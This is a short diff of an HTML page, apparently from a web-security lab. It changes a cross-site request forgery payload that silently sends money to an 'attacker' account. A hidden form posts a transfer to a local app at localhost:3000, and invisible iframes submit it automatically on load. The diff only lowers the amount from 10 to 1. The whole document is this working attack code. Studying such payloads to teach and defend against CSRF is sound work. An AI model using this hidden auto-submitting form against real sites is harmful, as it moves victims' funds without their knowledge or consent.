@@ -29,7 +29,7 @@
     </form>
     <form id="transfer" method="POST" target="iframe2" action="http://localhost:3000/post_transfer">
         <input name="destination_username" type="hidden" value="attacker">
-        <input name="quantity" type="hidden" value="10">
+        <input name="quantity" type="hidden" value="1">
     </form>
     <iframe style="width:0; height:0; border:0; border:none" name="iframe1" onload="transferMoney()"></iframe>
     <iframe style="width:0; height:0; border:0; border:none" name="iframe2" onload="bye()"></iframe>
